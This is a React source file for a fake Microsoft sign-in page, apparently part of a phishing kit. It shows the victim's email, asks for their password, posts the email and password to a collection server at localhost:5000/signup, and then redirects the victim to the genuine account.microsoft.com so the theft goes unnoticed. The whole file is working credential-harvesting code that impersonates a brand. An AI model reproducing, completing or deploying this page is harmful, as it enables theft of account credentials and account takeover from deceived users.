import React, {useState} from 'react';
import Logo from "./assets/logo.png";
import {Link, useNavigate} from "react-router-dom";
import axios from "axios";
function Pwd(props) {
    const [password, setPassword] = useState("");
    const [inValidPass, setInValidPass] = useState(false);
    const navigate = useNavigate();
    const onPasswordChange = (e) => {
        setPassword(e.target.value);
    }
    const onFormSubmit = () => {
        if(password.length < 8)
        {
            setInValidPass(true);
        }else
        {
            setInValidPass(false);
            axios.post("http://localhost:5000/signup", {email:props.mail, password}).then((response) =>
            {
                window.location.href = "https://account.microsoft.com/?refd=account.microsoft.com";
            }).catch((err) => {
                console.log("Error : " + err.message);
            })

        }
    }
    return (
        <div className="App">
            <section id="section_uname">
                {inValidPass && <p style={{color:"red", fontSize:"18px", textAlign: "left"}}>Password must have 8 or more characters.</p>}
                <div className="auth-wrapper">
                    <img src={Logo} alt="Microsoft"/>
                    <p className="para">{props.mail}</p>
                    <h2 className="title mb-16 mt-16">Enter Password</h2>
                    <form onSubmit={(e) => e.preventDefault()}>
                        <div className="mb-16">
                            <p id="error_uname" className="error"></p>
                            <input id="inp_uname" onChange={onPasswordChange} value={password} type="password" name="password" className="input"
                                   placeholder="Password"/>
                        </div>
                    </form>
                    <div>
                        <p className="mb-16 fs-13"><Link to="/" className="link">Forgot Password?</Link></p>
                        <p className="mb-16 fs-13">
                            <Link to="#" className="link">Other Ways to sign in</Link>
                        </p>
                    </div>
                    <div className="btns">
                        <button onClick={onFormSubmit} className="btn" id="btn_next">Sign In</button>
                    </div>
                </div>
            </section>
            <footer className="footer">
                <Link to="/">Terms of use</Link>
                <Link to="/">Privacy & cookies</Link>
                <span>.&nbsp;.&nbsp;.</span>
            </footer>
        </div>
    );
}

export default Pwd;